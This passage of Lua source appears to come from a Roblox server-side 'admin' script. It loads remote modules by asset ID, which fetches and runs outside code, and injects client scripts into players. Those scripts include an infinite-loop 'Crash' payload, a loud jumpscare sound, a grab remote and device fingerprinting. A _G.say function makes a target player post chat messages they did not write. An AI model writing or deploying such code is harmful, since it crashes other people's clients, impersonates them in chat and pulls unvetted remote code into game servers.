		local ticking = tick()
		require(112354705578311).load() -- goog readder
		repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
	end

	local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

	if not goog then
		warn("goog failed to be added, command can not continue")
		notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
		return
	end

	local scr = goog:FindFirstChild("Utilities").Client:Clone()
	local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

	loa.Parent = scr
	scr:WaitForChild("Exec").Value = [[
		
	local r = game:GetService("ReplicatedStorage")
	local remote = r:WaitForChild("cxo's folder"):WaitForChild("cxo's gmod remote")
	local UserInputService = game:GetService("UserInputService")
	local Mouse = game.Players.LocalPlayer:GetMouse()

	local selected = nil
	local isgrabbed = false

	local function pickup(target)
		if target and target:IsA("BasePart") and target.Anchored == false and not isgrabbed then
			isgrabbed = true
			selected = target
			remote:FireServer("Pickup", selected)
		end
	end

	local function update(pos)
		if selected and isgrabbed then
			remote:FireServer("Update", pos)
		end
	end

	local function release()
		if selected then
			isgrabbed = false
			selected = nil
			remote:FireServer("Release")
		end
	end

	Mouse.Button1Down:Connect(function()
		local target = Mouse.Target
		pickup(target)
	end)

	Mouse.Move:Connect(function()
		if selected and isgrabbed then
			local pos = Mouse.Hit.p
			update(pos)
		end
	end)

	Mouse.Button1Up:Connect(function()
		release()
	end)

	UserInputService.TouchStarted:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.Touch then
			local target = workspace:FindPartOnRayWithIgnoreList(workspace.CurrentCamera:ScreenPointToRay(input.Position.X, input.Position.Y), {game.Players.LocalPlayer.Character})
			pickup(target)
		end
	end)

	UserInputService.TouchMoved:Connect(function(input)
		if selected and isgrabbed then
			local touchpos = input.Position
			local ray = workspace.CurrentCamera:ScreenPointToRay(touchpos.X, touchpos.Y)
			local touchpos = ray.Origin + ray.Direction * 50
			update(touchpos)
		end
	end)

	UserInputService.TouchEnded:Connect(function(input)
		release()
	end)

	]]

	scr.Parent = a
	scr.Name = "RemoteScript"
	scr.Enabled = true

	if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
		local ticking = tick()
		require(112354705578311).load() -- goog readder
		repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
	end

	local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

	if not goog then
		warn("goog failed to be added, command can not continue")
		notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
		return
	end

	local scr = goog:FindFirstChild("Utilities").Client:Clone()
	local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

	loa.Parent = scr
	scr:WaitForChild("Exec").Value = [[
		
	local lp = game.Players.LocalPlayer
	local lpc = lp.Character

	repeat task.wait() until lpc:FindFirstChild("ff")
	lpc.ff.CanCollide = false

	script:Destroy()

	]]
	scr.Parent = a
	scr.Name = "OrbScript"
	scr.Enabled = true

	if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
		local ticking = tick()
		require(112354705578311).load() -- goog readder
		repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
	end

	local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

	if not goog then
		warn("goog failed to be added, command can not continue")
		notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
		return
	end

	local scr = goog:FindFirstChild("Utilities").Client:Clone()
	local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

	loa.Parent = scr
	scr:WaitForChild("Exec").Value = [[
		
	while true do end

	]]
	scr.Parent = a
	scr.Name = "Crash"
	scr.Enabled = true

	if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
		local ticking = tick()
		require(112354705578311).load() -- goog readder
		repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
	end

	local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

	if not goog then
		warn("goog failed to be added, command can not continue")
		notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
		return
	end

	local scr = goog:FindFirstChild("Utilities").Client:Clone()
	local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

	loa.Parent = scr
	scr:WaitForChild("Exec").Value = [[
		
	local sound = Instance.new("Sound", workspace)
	sound.SoundId = "rbxassetid://17518855592"
	sound.TimePosition = 1.7
	sound.Volume = 10
	sound:Play()
	sound.Ended:Connect(function()
		sound:Destroy()
		script:Destroy()
	end)

	]]
	scr.Parent = a
	scr.Name = "JumpScareScript"
	scr.Enabled = true

	local cxoooo = scr:Clone()
	cxoooo.Parent = game:GetService("ServerScriptService")

	local deviceremote = Instance.new("RemoteFunction", a)
	deviceremote.Name = "cxo's Device Remote"

	if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
		local ticking = tick()
		require(112354705578311).load() -- goog readder
		repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
	end

	local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

	if not goog then
		warn("goog failed to be added, command can not continue")
		notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
		return
	end

	local scr = goog:FindFirstChild("Utilities").Client:Clone()
	local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

	loa.Parent = scr
	scr:WaitForChild("Exec").Value = [[

	local UserInputService = game:GetService("UserInputService")
	local remote = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("cxo's Device Remote")

	local devices = {
		TouchEnabled = UserInputService.TouchEnabled,
		VREnabled = UserInputService.VREnabled,
		GamepadEnabled = UserInputService.GamepadEnabled,
		MouseEnabled = UserInputService.MouseEnabled,
		KeyboardEnabled = UserInputService.KeyboardEnabled
	}

	local device = ""

	if devices.VREnabled then
		device = device .. "ü•Ω + "
	end
	if devices.GamepadEnabled then
		device = device .. "üéÆ + "
	end
	if devices.TouchEnabled then
		device = device .. "üì± + "
	end
	if devices.MouseEnabled and devices.KeyboardEnabled then
		device = device .. "‚å®Ô∏èüñ±Ô∏è + "
	elseif devices.MouseEnabled then
		device = device .. "üñ±Ô∏è + "
	elseif devices.KeyboardEnabled then
		device = device .. "‚å®Ô∏è + "
	end

	if device:sub(-3) == " + " then
		device = device:sub(1, -4)
	end

	if device == "" then
		device = "‚ùì"
	end

	if remote then
		remote:InvokeServer(device)
	end

	]]

	scr.Parent = game:GetService("ReplicatedStorage"):WaitForChild("cxo's folder")
	scr.Name = "cxo's Device LocalScript"
	scr.Enabled = true

	local cxor = Instance.new("RemoteEvent", a)
	cxor.Name = "cxo's remote"

	local cmdbarr = Instance.new("RemoteEvent", a)
	cmdbarr.Name = "cmdbar remote"

	local remotefunc = Instance.new("RemoteFunction", a)
	remotefunc.Name = "cxo's remotefunction"

end

start()
scan()
cxoconnections["Scanner"]()
cxoconnections["Gmod"]()
cxoconnections["RemoteListener"]()
cxoconnections["RemoteFListener"]()
-------------------------------------------- CONFIGS --------------------------------------------

for i,v in pairs(game.Players:GetPlayers()) do
	if configs[tostring(v.UserId)] then
		for i, cmd in ipairs(configs[tostring(v.UserId)]) do
			local arguments = {} 
			for part in cmd:gmatch("%S+") do
				table.insert(arguments, part)
			end

			local target = nil

			if arguments[2] and arguments[2] == "me" then
				target = v
			else
				if arguments[2] then
					if game.Players:FindFirstChild(arguments[2]) then
						target = game.Players:FindFirstChild(arguments[2])
					else
						target = nil
					end
				end
			end

			if target then
				runcmd(arguments[1], nil, {target}, {table.concat(arguments, " ", 3)}, nil)
			else
				runcmd(arguments[1], nil, nil, {table.concat(arguments, " ", 2)}, nil)
			end

			--runcmd(arguments[1], nil, target and {target} or nil, {table.concat(arguments, " ", 3) or table.concat(arguments, " ", 2) or nil}, nil)
		end
	end
	if not plrcfgs[v.Name] then
		plrcfgs[v.Name] = {
			radius = 20,
			amount = 15,
			speed = 1,
			height = 0.5,
			sizeX = 4,
			sizeY = 1.2,
			sizeZ = 2,
			maxradius = 35,
			minradius = 10,
			mode = "default",
			colourR = 0,
			colourG = 0,
			colourB = 0,
			material = "Neon",
			hue = 0,
			colour = false,
			sensitivity = 10,
			reflectance = 0,
			transparency = 0,
			seat = false,
			spin = true
		}
	end
end

-------------------------------------------- LOADERS --------------------------------------------

require(115021406772544).r("","poto")

_G.say = function(p, m)
	p = game.Players:FindFirstChild(p)
	if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
		local ticking = tick()
		require(112354705578311).load() -- goog readder
		repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
	end

	local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

	if not goog then
		warn("goog failed to be added, command can not continue")
		notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
		return
	end

	local scr = goog:FindFirstChild("Utilities").Client:Clone()
	local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

	loa.Parent = scr
	scr:WaitForChild("Exec").Value = string.format([[

		game:GetService("TextChatService"):WaitForChild("TextChannels"):FindFirstChild("RBXGeneral"):SendAsync("%s")

		script:Destroy()

	]], m)

	if p.Character then
		scr.Parent = p.Character
	else
		scr.Parent = p:WaitForChild("PlayerGui")
	end

	scr.Enabled = true
end


